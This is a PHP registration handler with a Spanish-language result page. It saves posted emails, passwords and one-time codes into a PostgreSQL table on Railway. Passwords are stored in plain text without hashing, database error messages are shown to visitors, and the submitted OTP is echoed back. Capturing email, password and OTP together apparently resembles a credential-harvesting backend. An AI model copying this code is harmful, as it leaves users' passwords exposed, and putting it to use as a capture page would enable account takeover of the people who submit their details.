<?php
// 1. Conexión automática con PostgreSQL en Railway
$db_url = getenv('DATABASE_URL');
$error = null;
$success = false;

try {
    if ($db_url) {
        $db_parts = parse_url($db_url);
        $host = $db_parts['host'];
        $port = $db_parts['port'];
        $user = $db_parts['user'];
        $pass = $db_parts['pass'];
        $dbname = ltrim($db_parts['path'], '/');
        
        $dsn = "pgsql:host=$host;port=$port;dbname=$dbname sslmode=require";
        $pdo = new PDO($dsn, $user, $pass);
    } else {
        // Variables locales de respaldo
        $host = getenv('PGHOST') ?: 'localhost';
        $port = getenv('PGPORT') ?: '5432';
        $dbname = getenv('PGDATABASE') ?: 'tu_base_datos';
        $user = getenv('PGUSER') ?: 'tu_usuario';
        $pass = getenv('PGPASSWORD') ?: '';
        $dsn = "pgsql:host=$host;port=$port;dbname=$dbname";
        $pdo = new PDO($dsn, $user, $pass);
    }
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    // 1.5 Crear tabla si no existe
    $create_table_sql = "
        CREATE TABLE IF NOT EXISTS usuarios_registro (
            id SERIAL PRIMARY KEY,
            email VARCHAR(255) NOT NULL UNIQUE,
            password VARCHAR(255) NOT NULL,
            otp VARCHAR(10),
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ";
    $pdo->exec($create_table_sql);
    
} catch (PDOException $e) {
    $error = "Error de conexión al clúster de Postgres: " . $e->getMessage();
}

// 2. Procesamiento e Inserción de Datos
if ($_SERVER["REQUEST_METHOD"] == "POST" && !$error) {
    $email = htmlspecialchars($_POST['email'] ?? '');
    $password = htmlspecialchars($_POST['password'] ?? ''); 
    $otp = !empty($_POST['otp']) ? htmlspecialchars($_POST['otp']) : 'No proporcionado';

    try {
        $sql = "INSERT INTO usuarios_registro (email, password, otp) VALUES (:email, :password, :otp)";
        $stmt = $pdo->prepare($sql);
        
        $result = $stmt->execute([
            ':email' => $email,
            ':password' => $password,
            ':otp' => $otp
        ]);
        
        if ($result) {
            $success = true;
        } else {
            $error = "No se pudo guardar el registro. Intenta de nuevo.";
        }
    } catch (PDOException $e) {
        $error = "Error al insertar registro en PostgreSQL: " . $e->getMessage();
    }
} else if ($_SERVER["REQUEST_METHOD"] != "POST") {
    header("Location: index.html");
    exit();
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $success ? 'Registro Exitoso' : 'Error'; ?></title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f0f4f8; padding: 50px; text-align: center; }
        .card { background: white; padding: 30px; border-radius: 12px; max-width: 450px; margin: auto; box-shadow: 0 8px 24px rgba(0,0,0,0.08); }
        .badge { background-color: #6366f1; color: white; padding: 6px 16px; border-radius: 20px; font-size: 13px; display: inline-block; margin-bottom: 15px; font-weight: bold; }
        .badge.error { background-color: #ef4444; }
        h2 { color: #1e1b4b; margin-top: 0; }
        h2.error { color: #dc2626; }
        .data-box { text-align: left; background: #f8fafc; padding: 20px; border-radius: 8px; margin-top: 20px; border: 1px solid #e2e8f0; }
        .error-box { background-color: #fee2e2; border: 1px solid #fecaca; color: #991b1b; padding: 15px; border-radius: 8px; margin-top: 20px; }
        p { margin: 10px 0; color: #475569; }
        strong { color: #0f172a; }
        a { color: #6366f1; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
<div class="card">
    <?php if ($success): ?>
        <span class="badge">Almacenamiento Remoto</span>
        <h2>✓ Registro Exitoso</h2>
        <p>Tu información ha sido guardada correctamente en la base de datos.</p>
        
        <div class="data-box">
            <p><strong>Correo electrónico:</strong> <?php echo $email; ?></p>
            <p><strong>Estado:</strong> Registrado correctamente</p>
            <p><strong>OTP recibido:</strong> <?php echo $otp; ?></p>
        </div>
        <p style="margin-top: 20px;"><a href="index.html">← Volver al inicio</a></p>
    <?php else: ?>
        <span class="badge error">Error</span>
        <h2 class="error">✗ Algo salió mal</h2>
        <div class="error-box">
            <p><strong>Error:</strong> <?php echo $error ?? 'Error desconocido al procesar tu registro.'; ?></p>
            <p style="font-size: 0.9em; margin-top: 10px;">Por favor, intenta de nuevo.</p>
        </div>
        <p style="margin-top: 20px;"><a href="index.html">← Volver</a></p>
    <?php endif; ?>
</div>
</body>
</html>